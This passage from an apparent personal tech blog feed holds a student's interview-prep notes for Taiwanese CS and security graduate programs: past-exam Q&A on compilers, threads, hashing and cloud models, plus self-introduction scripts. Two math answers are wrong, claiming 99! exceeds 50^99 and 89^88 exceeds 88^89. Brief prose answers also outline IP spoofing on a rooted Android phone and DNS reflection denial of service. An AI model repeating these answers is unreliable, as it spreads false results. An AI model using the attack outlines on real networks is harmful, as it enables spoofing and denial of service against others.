開發板與驅動程式原始碼：例如 WiFi 模組的 SDK，如 ESP8266 或 ESP32 等開發板的 SDK 和原始碼。</li><li>   C 編譯器與工具鏈：適合目標設備的交叉編譯器（如 GCC 工具鏈），以便將 C 代碼編譯成設備可執行的格式。</li><li>   開發板驅動程式 API 文件：瞭解硬體功能和 API 介面，以便使用正確的函數和控制指令。</li><li>   測試與調試工具：如 JTAG 調試器或 UART 串口工具，便於測試和調整功能。</li></ol></li><li><p>Q: OpenID 和 OAuth 差別<br>A: OpenID 用於「身份驗證」，確認使用者的身份；OAuth 用於「授權」，允許應用程式訪問使用者的特定資源。簡而言之，OpenID 是「誰是你？」而 OAuth 是「可以做什麼？」</p></li><li><p>Q: Instrution-Set Architecture 和 Micro Architecture 差別<br>A: Instruction-Set Architecture (ISA) 定義了電腦處理器所能執行的指令和操作，是硬體和軟體之間的界面。而 Microarchitecture 則是實現這些指令的內部設計結構，決定處理器如何具體執行 ISA 定義的指令。</p></li><li><p>Q: Linux Device Debug 和怎麼不重新編譯就可以測試多筆輸入<br>A: Linux Device Debug：可以使用 dmesg 或 printk() 來查看內核訊息，並使用 strace 或 gdb 調試程式行為。</p><p>測試多筆輸入不重新編譯：可以使用 echo 和 cat 搭配管線，或是把多筆測試資料放在檔案中，利用 &lt; filename 將多筆輸入導入程式，無須重新編譯即可測試不同資料。</p></li><li><p>Q: Top-down 和 buttom-up parse 的差別<br>A: Top-down parse：從根節點開始，逐步將語法結構展開，直到符合輸入序列，常見方法是遞歸下降解析。</p><p>Bottom-up parse：從輸入序列開始，逐步將符號歸約成更高層的語法結構，直到達到根節點，常見方法是移入-歸約解析（如 LR 解析）。</p></li><li><p>Q: 寫個演算法可以找到 Set 中特定的 Item，並嘗試用 GPU 加速<br>A: </p><ol><li>   使用演算法遍歷 Set 中的元素，逐一比對是否為目標 Item。</li><li>   將 Set 分割成多個部分，並在 GPU 中併行執行比對，利用 CUDA 或 OpenCL 等技術來平行化查找過程。</li><li>   在 GPU 中，分配每個執行緒去查找各自部分的元素，加速整體搜索過程。</li></ol></li><li><p>Q: 有個 service 可以 DNS 到 Google，有辦法讓他 access 到其他網站嗎?<br>A: 可以透過修改該服務的 DNS 設定，將它的解析目標指向其他網站的 IP 地址，這樣該服務就可以訪問指定的其他網站。</p></li></ol><h4 id="110-考古題"><a href="#110-考古題" class="headerlink" title="110 考古題"></a>110 考古題</h4><ul><li><a class="link"   href="https://hackmd.io/@as535364/110-NYCU-CS-aptitude-test" >https://hackmd.io/@as535364/110-NYCU-CS-aptitude-test <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>3 頁 5 面 25 題。</li></ul><ol><li><p>Q: 給你以下的 code，請你填空其中一個 if 的條件式，以輸出所有「相加為 sum 的兩個元素」。</p> <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">f</span>(<span class="type">int</span> arr[], <span class="type">int</span> n, <span class="type">int</span> sum) &#123;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="type">int</span> i=<span class="number">0</span>; i&lt;n; ++i ) &#123;</span><br><span class="line">        <span class="keyword">for</span> ( <span class="type">int</span> j=i+<span class="number">1</span>; j&lt;n; ++j ) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( ____________ ) &#123;</span><br><span class="line">                cout &lt;&lt; <span class="string">&#x27;(&#x27;</span> &lt;&lt; arr[i] &lt;&lt; <span class="string">&#x27;,&#x27;</span> &lt;&lt; arr[j] &lt;&lt; <span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p> A: if (arr[i] + arr[j] &#x3D;&#x3D; sum)</p></li><li><p>Q: 承上題，問你如何優化這個程式。<br>A: 我們可以建一個哈希表來讓時間複雜度為線性，避免使用兩層迴圈會造成二次方的時間複雜度，優化範例：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">f</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> n, <span class="type">int</span> sum)</span> </span>&#123;</span><br><span class="line">    unordered_set&lt;<span class="type">int</span>&gt; seen;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="type">int</span> target = sum - arr[i];</span><br><span class="line">        <span class="keyword">if</span> (seen.<span class="built_in">find</span>(target) != seen.<span class="built_in">end</span>()) &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&#x27;(&#x27;</span> &lt;&lt; arr[i] &lt;&lt; <span class="string">&#x27;,&#x27;</span> &lt;&lt; target &lt;&lt; <span class="string">&#x27;)&#x27;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        seen.<span class="built_in">insert</span>(arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p>Q: 給一個 reverse_bit 的程式挖空部分 code 給你填，例如 input 11 要 output 13（1011 -&gt; 1101）。<br>A: reverse_bit 實作：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">reverse_bit</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        result = (result &lt;&lt; <span class="number">1</span>) | (n &amp; <span class="number">1</span>);</span><br><span class="line">        n = n &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> n = <span class="number">11</span>;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">reverse_bit</span>(n) &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p>Q1: process 跟 thread 的差別?<br>A1: </p><ul><li>Process: 一個進程是操作系統中執行中的一個應用程式，每個進程擁有自己獨立的記憶體空間、資源和執行上下文。不同的進程之間不能直接分享記憶體或資源，除非通過特定的通訊方式（如管道、訊息佇列、共享記憶體等）。</li><li>Thread: 線程是進程中的最小執行單位，同一個進程內的線程共享記憶體空間和資源。線程之間的通訊比進程之間更高效，因為它們可以直接訪問相同的資料。</li></ul><p>Q2: 為啥需要 thread?<br>A2: </p><ul><li>並行處理: 線程允許同一個程式的多個部分同時執行，提高處理效率。特別是在 I&#x2F;O 密集型工作（如網路請求、讀寫檔案等）中，線程可以減少等待時間。</li><li>資源共享: 線程能共享相同的記憶體和資源，適合需要處理大量共享資料的應用程式（如網路伺服器等），不需要額外的 IPC（進程間通訊）開銷。</li></ul><p>Q3: 兩個 thread 都要去修改一個值但修完後你發現值怪怪的，為什麼，怎麼解決?<br>A3: 當多個線程同時修改同一個值時，如果沒有適當的同步機制，就會發生競爭條件（Race Condition），導致最終的值不符合預期。競爭條件是由於線程的操作無序造成的，比如一個線程在進行更新之前還未來得及完成，另一個線程就已經讀取並改寫了這個值。<br>解決方法：</p><ul><li>鎖（Lock）: 使用鎖機制（如互斥鎖 mutex），讓每次只有一個線程能進行修改，其他線程必須等到鎖釋放後才能繼續，保證修改過程是原子性的。</li><li>原子操作: 使用原子操作來保證對共享變數的操作是不可分割的，即每個操作都完整執行並確保無線程在執行時干擾。</li><li>條件變數: 有些時候多個線程需要按順序處理某些操作，可以配合條件變數來控制線程的執行順序。</li></ul><p>Q4: Deadlock 怎麼解決?<br>A4: Deadlock 是指當多個線程或進程因為相互等待對方釋放資源，從而導致程序無限期卡住的情況。<br>解決方法：</p><ul><li>避免循環等待: 保證所有鎖按照一致的順序獲取，避免互相等待。例如，A 和 B 必須以同樣順序獲取。</li><li>嘗試鎖機制: 使用可超時的鎖操作來避免等待超過一定時間。比如，在 tryLock 時限內獲取不到鎖，就自動放棄。</li><li>檢測並回收: 對於複雜的鎖定場景，可以使用監控機制檢測死鎖並回收資源。</li><li>減少鎖定的資源範圍: 減少每個線程持有鎖的時間或範圍，減少死鎖的可能性。</li></ul></li><li><p>Q: 問一堆 OS。<br>A: 先跳過，晚點回來整理一些 OS 常考觀念。</p></li><li><p>Q: Compiler 會做什麼<br>A: 編譯器（compiler）是用來將高階程式語言（例如 C、C++、Java 等）的程式碼轉換成機器碼，最後產生可執行檔案。編譯器的工作流程包含以下幾個重要階段：</p><ol><li><p>詞彙分析（Lexical Analysis）</p><ul><li>將原始程式碼分解為基本語彙單元（tokens），例如關鍵字、變數名稱、運算符等。</li><li>詞彙分析器會掃描程式碼，識別出這些基本單元，並移除空格與註解。</li></ul></li><li><p>語法分析（Syntax Analysis）</p><ul><li>將詞彙分析產生的語彙單元組合成樹狀結構（抽象語法樹，AST），確認語法是否符合語言的規範。</li><li>若語法不正確（如缺少分號或括號不匹配），編譯器會在此階段回報錯誤。</li></ul></li><li><p>語意分析（Semantic Analysis）</p><ul><li>確認變數是否已宣告、資料型態是否相容等，保證程式的邏輯正確。</li><li>若有型態錯誤（例如將字串賦值給整數變數），編譯器會在此階段回報錯誤。</li></ul></li><li><p>中間碼生成（Intermediate Code Generation）</p><ul><li>將抽象語法樹轉換為中間碼（例如三位元運算或虛擬機碼），這種碼比原始程式碼更接近機器碼，但仍具有可移植性。</li><li>中間碼提供了程式優化的基礎，並提升了跨平台的適應性。</li></ul></li><li><p>最佳化（Optimization）</p><ul><li>程式最佳化器會在中間碼上進行優化，提升執行效率或減少記憶體用量。例如迴圈優化、常數摺疊（constant folding）、無效碼刪除（dead code elimination）等。</li><li>不同的優化級別（例如 O1、O2、O3）提供了不同深度的優化。</li></ul></li><li><p>目標碼生成（Code Generation）</p><ul><li>將最佳化後的中間碼轉換為特定平台的機器碼或組合語言，並進行暫存器分配、指令選擇等工作。</li><li>這個階段的輸出是與硬體相關的機器碼，並可能進行進一步的精細優化。</li></ul></li><li><p>連結（Linking）</p><ul><li>將不同模組或函式庫連結在一起，解決外部符號（如外部變數或函式）的參照，產生最終的可執行檔案。</li><li>靜態連結會將所有依賴打包進可執行檔案，而動態連結則讓程式在執行時載入外部函式庫。</li></ul></li></ol></li><li><p>Q: Compiler 裡面是什麼結構?<br>A:<br>編譯器的內部結構通常由多個相互協作的模組組成，每個模組負責不同的功能，構成了完整的編譯過程。以下是編譯器的主要組成結構：</p><ol><li><p>前端（Front End）</p><ul><li>詞法分析器（Lexical Analyzer）：也稱為掃描器，負責將程式碼轉換成基本的詞素或符號（tokens）。這些詞素是語言的最小單位，例如變數、關鍵字、操作符等。</li><li>語法分析器（Syntax Analyzer）：也稱為剖析器，接收詞法分析器輸出的詞素序列，將其構建成抽象語法樹（AST），確認語法是否符合語言的文法規範。</li><li>語意分析器（Semantic Analyzer）：負責檢查語意是否正確，確保變數型態正確、函數調用是否合理等，並建立符號表（Symbol Table）以管理變數和函數的符號資訊。</li><li>中介碼生成器（Intermediate Code Generator）：將語法樹或語意樹轉換成平台中立的中介碼（Intermediate Representation, IR），為後續的最佳化與生成機器碼奠定基礎。</li></ul></li><li><p>中間層（Middle End）</p><ul><li>最佳化模組（Optimizer）：負責進行程式碼優化。此模組包括許多針對中介碼的優化步驟，例如循環優化、無效程式碼刪除、變數折疊（constant folding）、內聯（inlining）等，藉此提高程式效率。</li><li>數據流分析（Data Flow Analysis）：追蹤變數和指令的數據流，以便進一步優化，如消除死碼（dead code elimination）、拋棄無用的變數存取等。</li><li>控制流分析（Control Flow Analysis）：分析程式的控制流結構，進行一些跨區塊的最佳化處理，如區塊重新排序或分支預測（branch prediction）等。</li></ul></li><li><p>後端（Back End）</p><ul><li>目標碼生成器（Code Generator）：將優化後的中介碼轉換為特定硬體架構的機器碼或組合語言碼。這涉及選擇合適的指令集、暫存器分配等。</li><li>寄存器分配器（Register Allocator）：將變數映射到有限的硬體寄存器上，從而提高執行效率，減少內存訪問。</li><li>指令選擇器（Instruction Selector）：選擇適合目標硬體的機器指令，優化指令長度、減少執行時間。</li><li>匯編器與連結器（Assembler and Linker）：生成可執行檔案的最終步驟。匯編器將機器指令轉換為二進制碼，連結器將不同的模組或函數庫連結在一起，產生最終的可執行程式。</li></ul></li><li><p>符號表（Symbol Table）</p><ul><li>符號表是一個查詢資料結構，用來記錄變數、函數、類別等符號的名稱、型態、作用域及記憶體位址等資訊。此表由前端模組生成，並在中間層和後端用於優化與生成碼。</li></ul></li><li><p>抽象語法樹（AST, Abstract Syntax Tree）</p><ul><li>AST 是編譯器表示語法結構的樹狀資料結構，由語法分析器生成，並由語意分析器和最佳化模組進行進一步處理。AST 提供了一種簡化的樹形表示方式，使得編譯過程中的變換和優化更加方便。</li></ul></li><li><p>錯誤處理模組（Error Handling Module）</p><ul><li>編譯器中的錯誤處理模組用來捕捉並報告編譯過程中的詞法、語法和語意錯誤，並提供錯誤位置和建議修正信息，以幫助開發者快速修正程式碼。</li></ul></li><li><p>日誌與除錯模組（Logging and Debugging Module）</p><ul><li>此模組用來記錄編譯器執行過程中的信息，便於開發人員除錯和追蹤編譯器行為。日誌記錄對大型編譯器的維護和擴展具有重要作用。</li></ul></li></ol></li><li><p>Q: 50^99 跟 99! 誰比較大？<br>A: 我們可以都取對數來比較就會變成比較 99ln(50) 跟 99ln(99) - 99，所以 99! 應該會比較大。</p></li><li><p>Q: 88^89 跟 89^88 誰比較大？<br>A: 基數和指數相近時的比較方法：當基數和指數很接近時，可以考慮基數略大的那個數的次方更大。因為 89 比 88 稍大，而指數相差不大，所以 89^{88} 的增長會略微快於 88^{89}。</p></li><li><p>Q: 請問 IaaS、PaaS、SaaS 的差別，舉例說明。<br>A: </p><ul><li>IaaS（Infrastructure as a Service）提供基礎的 IT 基礎架構，包含虛擬機器、儲存、網路等資源。使用者可以直接管理和控制這些基礎設施（如選擇作業系統、安裝軟體），但不需要維護實體硬體。例子：Amazon Web Services (AWS) EC2、Microsoft Azure Virtual Machines、Google Compute Engine。</li><li>PaaS（Platform as a Service）提供的是平台層級的服務，包含運行應用所需的作業系統、中介軟體和開發工具等基礎設施。開發者可以在這個平台上開發、運行和管理應用程式，而不需要處理底層的基礎架構。例子：Google App Engine、Microsoft Azure App  </li><li>SaaS (Software as a Service) 是一種軟體服務模式，用戶可以透過網路直接使用軟體應用程式，無需安裝、配置和管理軟體。這些軟體通常運行在提供商的伺服器上，並透過瀏覽器或客戶端應用程式來訪問。例子：Google Workspace (如 Gmail、Google Drive)、Salesforce、Microsoft 365。</li></ul></li><li><p>Q: VM 跟 Container 差在哪裡，分別適合什麼時候用?<br>A: </p><table><thead><tr><th>特徵</th><th>VM（Virtual Machine）</th><th>Container</th></tr></thead><tbody><tr><td><strong>架構</strong></td><td>包含完整的 OS，包括內核和應用程式</td><td>共用宿主機的 OS 內核，只包含應用和依賴</td></tr><tr><td><strong>啟動速度</strong></td><td>慢（需要完整的作業系統啟動時間）</td><td>快（秒級別啟動）</td></tr><tr><td><strong>資源使用</strong></td><td>重（每個 VM 需要獨立的 OS，消耗更多資源）</td><td>輕（共用內核，資源需求低）</td></tr><tr><td><strong>隔離性</strong></td><td>高，VM 之間完全隔離</td><td>中等，共用內核但仍具備一定程度的隔離性</td></tr><tr><td><strong>可移植性</strong></td><td>受限於不同的虛擬化技術和環境</td><td>高，可以在任何支持容器的平台上運行</td></tr><tr><td><strong>管理</strong></td><td>需要管理整個作業系統和應用程式</td><td>只需管理應用和依賴</td></tr></tbody></table><p>總結：</p><ul><li>VM 提供較高的隔離性和完整的操作系統環境，適合多作業系統需求或安全性要求較高的應用。</li><li>Container 則著重輕量和快速啟動，非常適合 DevOps 流程、微服務架構和雲端原生應用。</li></ul></li><li><p>Q: 簡單說明 Hash 並列出兩個 Hash 的特性<br>A: Hash 是一種將輸入數據（例如文字或文件）透過特定演算法轉換為固定長度的字串（稱為 hash 值或 hash 碼）的技術。這種轉換是單向的，即很難或不可能從 hash 值還原原始數據。Hash 常用於數據完整性驗證、密碼存儲和數位簽章。<br>Hash 的兩個特性：</p><ul><li>不可逆性<br>Hash 是單向的，理論上無法從 hash 值反推出原始數據。這使得 hash 適合用於密碼存儲和數據隱私保護。</li><li>碰撞抗性<br>碰撞抗性表示很難找到兩組不同的輸入會產生相同的 hash 值。理想情況下，兩個不同的輸入數據應該有不同的 hash 值，以防止碰撞攻擊（Collision Attack）。</li></ul></li><li><p>Q: Lex 和 Yacc 是什麼？<br>A: </p><ul><li>Lex 是一個詞法分析器生成器，它負責將輸入的文字分解成詞素（Token），也就是程式碼的最小語法單位，例如關鍵字、變數名、數字等。Lex 會依照規則識別這些詞素，並為每個詞素分配一個特定的型別（Token type），供語法分析器（如 Yacc）進行處理。</li><li>Yacc 是一個語法分析器生成器，它使用來自 Lex 的詞素來構建語法樹或解析樹。Yacc 使用上下文無關文法（CFG）來描述語法結構，並基於這些規則解析詞素的結構。Yacc 的全稱是 “Yet Another Compiler Compiler”。</li></ul><p>實例說明：<br>假設我們要解析一個簡單的數學表達式 3 + 5 * (2 - 1)：</p><ul><li>Lex 負責分解為詞素：3、+、5、*、(、2、-、1、)</li><li>Yacc 根據運算規則（例如先乘除後加減）構建語法樹，解釋這個表達式的結構和順序</li></ul></li><li><p>Q: C 的 Functional Pointer 相關問題<br>A: 暫時跳過</p></li><li><p>Q: 雜湊函數 Hash,常見的例子<br>A: </p><ul><li>MD5（Message Digest Algorithm 5）<ul><li>特性：產生 128 位元（16 字節）的雜湊值，速度快，適合快速查找或驗證。</li><li>用途：早期用於數據完整性驗證和密碼儲存，但由於弱抗碰撞性（容易找到兩個不同輸入產生相同的雜湊值），現在已不建議用於安全敏感的應用。</li></ul></li><li>SHA-256（Secure Hash Algorithm 256）<ul><li>特性：屬於 SHA-2 系列，產生 256 位元（32 字節）的雜湊值，具有較高的抗碰撞性。</li><li>用途：目前在許多安全場景中被廣泛使用，如數據簽名、區塊鏈和證書驗證。</li></ul></li></ul></li><li><p>Q: Android IP Spoofing 是什麼？<br>A: Android IP Spoofing 是一種網路攻擊技術，通過偽造 IP 地址來掩蓋發送端的真實身份，以實現未經授權的數據訪問或繞過安全限制。這種技術通常被用來發起分佈式拒絕服務攻擊（DDoS）或繞過基於 IP 的防火牆等。IP spoofing 並不局限於 Android 平台，但在 Android 設備上，攻擊者可以利用特定的網路工具或自定義應用程序來偽造發送端的 IP 地址。</p></li></ol><h4 id="109-考古題"><a href="#109-考古題" class="headerlink" title="109 考古題"></a>109 考古題</h4><ul><li><a class="link"   href="https://hackmd.io/@splitline/BkALfYY5r" >https://hackmd.io/@splitline/BkALfYY5r <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul><ol><li>   Q: Node.js 的出現有什麼很大的影響？它有什麼特色？<br>  A: Node.js 改變了後端開發的方式，允許使用 JavaScript 建構非同步、事件驅動的高效能應用。特色包括單執行緒模型、高效能 I&#x2F;O 處理、支援 NPM 等模組化設計。</li><li>   Q: 比較分析 React vs Vue 或 Angular 或你用過的前端框架<br>  A: React 側重於 UI 元件化、可重複利用和快速渲染；Vue 易於學習、雙向數據綁定、靈活性高；Angular 是完整框架，擁有強類型支援和完整工具鏈，適合大型應用。</li><li>   Q: 常用的網管工具有哪些？<br>  A: 常用工具包括 Wireshark、Nagios、Zabbix、Prometheus、Grafana 和 Nmap，這些工具幫助監控網絡流量、伺服器健康度、效能和安全性。</li><li>   Q: 如何撰寫 int freq_mode(int a, int b, int c, int d)，回傳眾數出現的次數？<br>  A: 透過使用 STL 的 std::map 或 unordered_map 來計算每個數字的出現次數，找出最高次數即可。</li><li>   Q: 如何實作包覆三維平面上的 n 個點的球型，半徑必須小於最小解的兩倍，且達到 O(n) 解？<br>  A: 可使用 Welzl’s Algorithm，逐點隨機放置到球體中，重複至包覆所有點。此方法達成 O(n) 複雜度。</li><li>   Q: 如何找出陣列 int A[n] 第二小的數並達成 O(n) 解？<br>  A: 使用線性掃描過濾出最小和第二小的元素，藉由一次遍歷達到 O(n) 複雜度，無法比 Ω(n) 更快。</li><li>   Q: memory allocation 太慢怎麼 debug？可以用什麼工具解決？<br>  A: 使用 valgrind 的 massif 或 perf 工具檢查記憶體分配問題；可透過記憶體池（memory pool）改善效率。</li><li>   Q: IDS（入侵檢測系統）和 AV（防毒軟體）有何不同？各檢查什麼？為什麼很難擋住 APT？<br>  A: IDS 側重於網路流量分析，AV 側重於檢測檔案特徵碼。APT 較隱蔽，利用多層次和持久性，難以單靠 IDS 和 AV 攔截。</li><li>   Q: 為什麼 hashing 在 Linux Kernel 中那麼常見？<br>  A: Hashing 能夠快速查找數據，適合處理 Kernel 中大量數據管理的需求，如系統調度、文件快取和網路路由。</li><li>   Q: 舉一個你會實作的較複雜演算法，並用 30 字簡介<br> A: Floyd-Warshall 演算法，用於計算所有點對間的最短路徑，複雜度為 O(n^3)，適合密集圖。</li><li>   Q: Stack 和 Queue 分別是什麼？分別適用於什麼演算法？<br> A: Stack（堆疊）為先進後出，常用於遞迴和 DFS；Queue（佇列）為先進先出，適用於 BFS 和排程。</li><li>   Q: 開發 Linux Kernel 或 Driver 時如何 debug？可以不重新編譯測試多筆輸入嗎？<br> A: 可使用 kgdb、ftrace 或 dmesg 進行 Kernel debug，可透過 debugfs 或動態修改 sysfs 參數以測試不同輸入。</li><li>   Q: Android 手機可以進行 IP Spoofing 嗎？如何操作？<br> A: 可以，在 Root 權限下使用 iptables 或自訂 Socket 寫入自訂 IP 地址達到 IP Spoofing 效果。</li><li>   Q: 如何在 Wi-Fi Router 上新增 C 程式功能？需要哪些工具？<br> A: 編譯 OpenWRT&#x2F;DD-WRT 或使用開源韌體 SDK 編寫，使用交叉編譯工具、串口燒錄和適配器。</li><li>   Q: GMM 和 K-means 有何不同？請說明原理<br> A: K-means 假設每個叢集形狀為圓，GMM 利用高斯分布來估計，允許各叢集有不同形狀。</li><li>   Q: Server 虛擬化的好處是什麼？常用的工具有哪些？<br> A: Server 虛擬化增加資源利用率和隔離性，工具有 VMware、KVM、Hyper-V 和 VirtualBox 等。</li><li>   Q: 解釋加速方式 (a) SIMD (b) GPGPU (c) FPGA (d) MPI 並舉例<br> A: (a) SIMD: 單指令多數據，如向量計算；(b) GPGPU: 使用 GPU 做並行運算，如 AI 訓練；(c) FPGA: 可重組邏輯，加速專用計算；(d) MPI: 分散式多處理，如超級計算機。</li><li>   Q: 偵錯效能瓶頸 (a) 程式瓶頸 (b) 快取缺失 (c) 區域性問題<br> A: (a) 程式瓶頸：分析 perf；(b) 快取缺失：調整數據結構和存取模式；(c) 區域性：改善記憶體區域性。</li><li>   Q: DNS 反射攻擊如何實作？<br> A: 利用開放的 DNS 伺服器將查詢反射至目標 IP，造成拒絕服務，使用小詢問封包造成大回應。</li><li>   Q: 說明 Attention 機制<br> A: Attention 用於提升深度學習模型的效能，透過關注重要部分資料，使模型更高效學習關鍵特徵。</li><li>   Q: 你的開發環境？有無 GitHub 協作經驗或程式檢定經驗？<br> A: 使用 VSCode 和 Git，擁有 GitHub 協作經驗</li><li>   Q: 你負責的最具挑戰的專案或成就？<br> A: 略</li></ol><h2 id="國立清華大學資訊安全研究所"><a href="#國立清華大學資訊安全研究所" class="headerlink" title="國立清華大學資訊安全研究所"></a>國立清華大學資訊安全研究所</h2><p>面試有五分鐘，其中三分鐘自我介紹，還蠻充裕的。<br>面試結構如下：</p><ul><li>記憶順序：<ul><li>打招呼＋學校姓名</li><li>實習的研究<ul><li>Entra ID Recon</li><li>Qnap NAS</li></ul></li><li>比賽<ul><li>出題</li><li>HITCON CTF Final</li></ul></li><li>社群<ul><li>台灣好厲駭研究</li><li>AIS3</li><li>TSC、NCKUCTF、B33F 50UP<ul><li>TSC 辦過全國比賽跟資安院辦過活動</li><li>NCKUCTF DC 不到一年超過九百人，幹部們一起建立了完整線上資源</li><li>B33F 50UP 新生代最強戰隊，有讀書會</li></ul></li><li>DEVCORE 獎學金</li><li>資安院邀請開課</li><li>SCIST 元智邀請講課 Repo 超過六十顆星</li><li>SITCON 和 HITCON、COSCUP 都擔任過講者</li></ul></li><li>提問引導<ul><li>請問教授對於我在實習期間的研究或是出題經驗或是後天的 HITCON CTF Final 有什麼想要提問的？</li></ul></li></ul></li></ul><h2 id="國立臺灣科技大學資訊安全科技與管理碩士班"><a href="#國立臺灣科技大學資訊安全科技與管理碩士班" class="headerlink" title="國立臺灣科技大學資訊安全科技與管理碩士班"></a>國立臺灣科技大學資訊安全科技與管理碩士班</h2><p>英文回答準備：</p><ul><li>在比賽中的貢獻？<ul><li>In competitions, I focus on binary exploitation and reverse engineering challenges. My expertise allows me to analyze binaries quickly, identify vulnerabilities, and devise solutions, which often gives our team a strategic advantage. Additionally, I contribute by supporting team members on other technical tasks, sharing insights, and coordinating our efforts to ensure efficient problem-solving. This collaborative approach strengthens our overall performance and helps us achieve high scores.</li></ul></li><li>實習的經驗？<ul><li>During my internships, I gained hands-on experience in various aspects of cybersecurity. At my current internship with Cycraft, I developed a reconnaissance tool for Entra ID tailored for all listed companies in Taiwan, based on the open-source AADInternal project. This allowed me to uncover and analyze key information relevant to cybersecurity risks. In addition, I recently completed a security analysis of QNAP NAS vulnerabilities, specifically targeting issues that could arise during M365 backups.</li><li>In these roles, I learned to apply security concepts in practical scenarios, developed my skills in identifying vulnerabilities, and strengthened my understanding of effective security protocols. Each internship has deepened my expertise and prepared me to make more substantial contributions to the cybersecurity field.</li></ul></li><li>教學經驗？<ul><li>I have been invited to teach in various places, where I design practical exercises, homework assignments, recorded videos, and slides for my classes. To provide easy access to these resources, I created a GitHub repository that hosts all my teaching materials. The repository has received positive feedback from the community and has accumulated over sixty stars, reflecting its value to students and other cybersecurity enthusiasts. This experience has allowed me to make a broader impact by sharing my teaching methods and resources with a larger audience.</li></ul></li><li>AIS3 的經驗？<ul><li>This year, I served as a judge for the AIS3 CTF group, evaluating participants’ projects and providing feedback. I was also a teaching assistant, supporting participants throughout the event, and contributed as a problem creator for both the Pre-exam and MyFirstCTF at the beginning of the year. Additionally, I took on the role of a speaker for the AIS3 Club, where I delivered lectures on cybersecurity topics.</li><li>Last year, I was a team member at AIS3 and worked on a project focused on the Moodle CVE-2023-35133 SSRF 1day vulnerability. This project gave me practical experience in vulnerability research and exploitation, deepening my expertise in real-world cybersecurity challenges.<blockquote><p>C-V-E twenty twenty-three three five one three three</p></blockquote></li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;通用自我介紹&quot;&gt;&lt;a href=&quot;#通用自我介紹&quot; class=&quot;headerlink&quot; title=&quot;通用自我介紹&quot;&gt;&lt;/a&gt;通用自我介紹&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;五到六分鐘詳細介紹中文版：&lt;ul&gt;
&lt;li&gt;各位評審好，我是來自國立成功大學的葉東逸，在資安圈大</summary>
      
    
    
    
    
    <category term="education" scheme="https://kazma.tw/tags/education/"/>
    
    <category term="career" scheme="https://kazma.tw/tags/career/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges SpookTastic Writeup</title>
    <link href="https://kazma.tw/2024/11/02/HackTheBox-Challenges-SpookTastic-Writeup/"/>
    <id>https://kazma.tw/2024/11/02/HackTheBox-Challenges-SpookTastic-Writeup/</id>
    <published>2024-11-02T05:39:19.850Z</published>
    <updated>2024-11-02T06:18:11.211Z</updated>
    
